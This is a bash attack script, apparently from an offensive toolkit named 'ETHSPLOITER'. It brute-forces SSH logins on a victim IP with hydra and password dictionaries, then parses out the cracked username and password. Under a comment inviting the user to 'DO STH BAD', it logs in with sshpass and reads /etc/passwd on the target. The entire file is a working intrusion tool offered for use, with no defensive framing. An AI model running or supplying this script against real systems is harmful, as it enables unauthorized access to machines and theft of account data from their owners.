#!/bin/bash

if [[ $# -lt 2 ]]; then
	echo "Usage ./sshbrute.sh <IP> <ETHSPLOITER_PATH>"
	exit 1
fi

VICTIM_IP=$1
ETHSPLOITER_PATH=$2


HYDRA_OUT=/tmp/hydra_out

hydra -L $ETHSPLOITER_PATH/exploits/multi/ssh/login/user -P $ETHSPLOITER_PATH/exploits/multi/ssh/login/pass ssh://$VICTIM_IP -o $HYDRA_OUT

PASS_FOUND=`cat $HYDRA_OUT | wc -l`
if [[ $PASS_FOUND -eq 1 ]]; then
	echo "Couldn't log into ssh with login:pass dict"
	exit 1
fi

line=`tail $HYDRA_OUT -n 1`

HOST="`echo $line | sed 's/^.*host: \(.*\)\s\+login: .*$/\1/g'`"
USER="`echo $line | sed 's/^.*login: \(.*\)\s\+password: .*$/\1/g'`"
PASS="`echo $line | sed 's/^.*password: \(.*\)$/\1/g'`"
echo "Cracked: host=$VICTIM_IP user=$USER pass=$PASS"

# ------------------------------------------------------------------------
# DO STH BAD, YOU HAVE ACCESS TO THE SHELL
# ------------------------------------------------------------------------
echo "Executing bad script on $HOST"
sshpass -p $PASS ssh $USER@$VICTIM_IP "cat /etc/passwd"
# expect -c 'spawn ssh '$USER'@'$VICTIM_IP' "cat /etc/passwd"; expect "assword:"; send "'$PASS'\r"; interact'


